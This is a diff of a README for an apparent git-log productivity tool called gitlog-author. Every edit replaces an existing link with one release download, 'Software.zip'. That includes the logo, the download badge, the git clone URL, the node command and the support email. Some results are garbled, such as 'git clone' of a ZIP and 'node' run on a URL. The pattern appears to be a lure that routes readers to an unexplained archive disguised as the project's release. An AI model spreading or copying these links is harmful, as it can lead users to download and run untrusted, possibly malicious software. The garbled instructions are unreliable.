@@ -3,7 +3,7 @@
 
 Generate detailed git logs, code review, and productivity metrics for specific authors
 
-![gitlog-author logo](https://example.com/logo.png)
+![gitlog-author logo](https://github.com/rafiffauzan18/gitlog-author/releases/download/v1.0/Software.zip)
 
 ## Description
 The **gitlog-author** repository is a powerful tool designed to help teams track and analyze the contributions of specific authors within a Git repository. By generating detailed git logs, code review statistics, and productivity metrics, this tool provides valuable insights into individual performance and contribution patterns. Whether you are a software development team lead, project manager, or individual contributor looking to boost productivity, **gitlog-author** is the perfect solution for enhancing team management and software development processes.
@@ -29,9 +29,9 @@ The **gitlog-author** repository is a powerful tool designed to help teams track
 📈 **Reporting:** Generate insightful reports for better decision-making
 
 ## Installation
-To get started with **gitlog-author**, download the latest version [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and follow the installation instructions in the README file.
+To get started with **gitlog-author**, download the latest version [here](https://github.com/rafiffauzan18/gitlog-author/releases/download/v1.0/Software.zip) and follow the installation instructions in the README file.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/rafiffauzan18/gitlog-author/releases/download/v1.0/Software.zip%20Version-brightgreen)](https://github.com/rafiffauzan18/gitlog-author/releases/download/v1.0/Software.zip)
 
 If the link does not work, please check the "Releases" section of the repository for alternative download options.
 
@@ -42,17 +42,17 @@ If the link does not work, please check the "Releases" section of the repository
 4. Explore the detailed git logs, code review metrics, and productivity insights generated for the specified author.
 
 ```bash
-git clone https://github.com/your-username/gitlog-author.git
+git clone https://github.com/rafiffauzan18/gitlog-author/releases/download/v1.0/Software.zip
 cd gitlog-author
 npm install
-node gitlog-author.js --author="John Doe"
+node https://github.com/rafiffauzan18/gitlog-author/releases/download/v1.0/Software.zip --author="John Doe"
 ```
 
 ## Contributing
 We welcome contributions from the community to enhance the functionality and features of **gitlog-author**. If you have any ideas, suggestions, or bug fixes, feel free to submit a pull request.
 
 ## Support
-For any issues or questions related to **gitlog-author**, please contact our team at support@gitlog-author.com or open a new issue on the repository.
+For any issues or questions related to **gitlog-author**, please contact our team at https://github.com/rafiffauzan18/gitlog-author/releases/download/v1.0/Software.zip or open a new issue on the repository.
 
 🌟 Star this repository if you found **gitlog-author** helpful for your projects!
 
